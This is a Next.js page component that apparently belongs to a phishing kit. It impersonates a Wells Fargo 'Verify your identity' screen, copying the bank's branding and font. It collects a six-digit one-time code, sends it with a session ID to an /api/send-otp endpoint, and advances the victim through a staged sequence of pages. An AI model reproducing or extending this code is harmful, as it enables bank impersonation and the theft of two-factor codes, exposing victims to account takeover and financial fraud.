import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { Box } from "@mui/system";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import InputMask from "react-input-mask";
import { CustomInput } from "../components/CustomInput";
import { Footer } from "../components/Footer";
import { Header } from "../components/Header";
import { SubmitButton } from "../components/SubmitButton";
import { Wrapper } from "../components/Wrapper";
import { DataContext } from "./_app";
import axios from "axios";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import Email from "./email";

interface OtpProps {}

const schema = yup.object().shape({
  otp: yup
    .number()
    .typeError(`Please enter a valid one time pin`)
    .required("Please enter the one time pin we sent you")
    .test(
      "len",
      "Please enter a valid one time pin",
      (val) => !!(val && val.toString().length === 6)
    ),
});

export const Otp: React.FC<OtpProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `ONE TIME PIN`);
    formData.append(
      `otp`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-otp`, formData);
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      otp: data,
    });

    const url = getProgress()[getProgress().indexOf(`OTP`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <>
      <Header />
      <Wrapper
        title="Verify your identity"
        paragraph="For your secuirty, please enter the one time code we sent you."
        titleSX={{
          color: "#d20826",
          fontSize: "40px",
          lineHeight: "44px",
          textAlign: "center",
          position: "relative",
          display: "block",
          padding: "48px 0 0",
          outline: "none",
          marginBottom: "24px",
          fontFamily: '"Wells Fargo Serif",Georgia,serif',
          fontWeight: "400",
        }}
      >
        <Head>
          <title>Wells Fargo - Verify your identity</title>
        </Head>
        <Box paddingBottom="32px">
          <InputMask mask="9 9 9 9 9 9" {...register("otp")}>
            {
              // @ts-ignore
              () => (
                <CustomInput
                  error={
                    !!(errors.otp && (errors.otp.message as unknown as string))
                  }
                  errorMessage={
                    errors.otp && (errors.otp.message as unknown as string)
                  }
                  label="One Time Code"
                  register={register("otp")}
                />
              )
            }
          </InputMask>
        </Box>
        <Box
          component="section"
          sx={{
            margin: "1rem auto .625rem",
            display: "block",
          }}
        />
        <SubmitButton text="Continue" disabled={loading} onClick={onSubmit} />
      </Wrapper>
      <Footer />
    </>
  );
};

export default Otp;
